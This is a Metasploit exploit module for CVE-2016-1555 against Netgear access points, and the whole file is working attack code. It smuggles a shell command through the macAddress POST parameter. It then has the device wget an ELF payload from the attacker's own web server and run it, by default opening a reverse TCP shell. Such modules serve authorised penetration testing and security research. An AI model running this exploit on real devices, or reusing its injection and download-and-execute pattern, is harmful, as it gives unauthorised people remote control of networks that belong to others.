##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Netgear Devices Unauthenticated Remote Command Execution',
      'Description' => %q{
        From the CVE-2016-1555 page: (1) boardData102.php, (2) boardData103.php,
        (3) boardDataJP.php, (4) boardDataNA.php, and (5) boardDataWW.php in
        Netgear WN604 before 3.3.3 and WN802Tv2, WNAP210v2, WNAP320, WNDAP350,
        WNDAP360, and WNDAP660 before 3.5.5.0 allow remote attackers to execute
        arbitrary commands.
      },
      'Author'      =>
        [
          'Daming Dominic Chen <ddchen[at]cs.cmu.edu>', # Vuln discovery
          'Imran Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # MSF module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2016-1555'],
          ['URL', 'https://kb.netgear.com/30480/CVE-2016-1555-Notification?cid=wmt_netgear_organic'],
          ['PACKETSTORM', '135956'],
          ['URL', 'http://seclists.org/fulldisclosure/2016/Feb/112']
        ],
      'DisclosureDate' => 'Feb 25 2016', # According to http://seclists.org/fulldisclosure/2016/Feb/112
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Arch'        => ARCH_MIPSBE,
      'Payload'     => {},
      'DefaultOptions' => {
        'PAYLOAD'  => 'linux/mipsbe/shell_reverse_tcp',
        'WfsDelay' => 5 },
      'Targets'        =>
        [
          [ 'Automatic',	{ } ]
        ],
      'DefaultTarget'  => 0
      ))

    register_options(
      [
        OptPath.new('URI_LIST', [true,  "The vulnerable URIs.", '/usr/share/metasploit-framework/data/wordlists/netgear_boardData_paths.txt']),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 5]),
      ])
    deregister_options('SSL') # because victim side does not support SSL
    deregister_options('SSLCert') # if SSL is disabled, might as well disable this for cleaner interface
  end

  # post request
  def request_post(uri,command)
    response = send_request_cgi({
      'uri'    => uri,
      'method' => 'POST',
      'data'   => "macAddress=000000000000;#{command};&reginfo=1&writeData=Submit\r\n"
    })
    return response
  end

  # get request
  def request_get(uri)
    response = send_request_cgi({
      'uri'    => normalize_uri('/', uri),
      'method' => 'GET'
    })
    return response
  end

  # find the vulnerable uri(s)
  def find_uri
    conn_check = request_get("/")
    if not conn_check
      return :fail
    else
      File.read(datastore['URI_LIST']).each_line do |uri|
        response_get = request_get(uri.chomp)
        if response_get && response_get.code == 200
#          print_good("Got 200 OK for #{uri.chomp}")
          return uri.chomp
        end
      end
      return :fail.to_s
    end
  end

  # check for vulnerability existence
  def check
    lhost = datastore['LHOST'] # implied
    vuln_check_param = "ping -c 1 #{lhost}"
    target_uri = find_uri
    if target_uri == "fail"
      fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
    else
      print_status("Checking for existence of vulnerability in #{target_uri}...")
      response_post = request_post(target_uri,vuln_check_param)
      if response_post && response_post.code == 200
        print_good("Got 200 OK for #{target_uri}")
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    end
  end


  # the exploit method
  def exploit
    # run a check before attempting to exploit
    unless [CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
    end

    lhost = datastore['LHOST'].to_s
    downfile = datastore['URIPATH'] || rand_text_alpha(8+rand(8))
    resource_uri = '/' + downfile # the payload to be downloaded
    service_url = service_url = 'http://' + lhost + ':' + datastore['SRVPORT'].to_s + resource_uri # the full path of the payload on our web server
    vuln_uri = find_uri

    # payload creation
    @pl = generate_payload_exe
    @elf_sent = false

    print_status("Starting the web service on #{service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => resource_uri
     }})

    filename = downfile
    cmd = "wget #{service_url} -O /tmp/#{filename}; chmod 777 /tmp/#{filename}; nohup /tmp/#{filename}"
    register_file_for_cleanup("/tmp/#{filename}")
    res = request_post(vuln_uri,cmd)
  end


  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if (not @pl)
      print_error("A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
    wait_linux_payload
  end


  # wait for the data to be sent
  def wait_linux_payload
    if @elf_sent == true
      stop_service
    end
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      wait_time += 1
      if (wait_time > datastore['HTTP_DELAY'])
        fail_with(Failure::Unknown, "Target didn't request request the ELF payload!")
      end
    end
  end
end
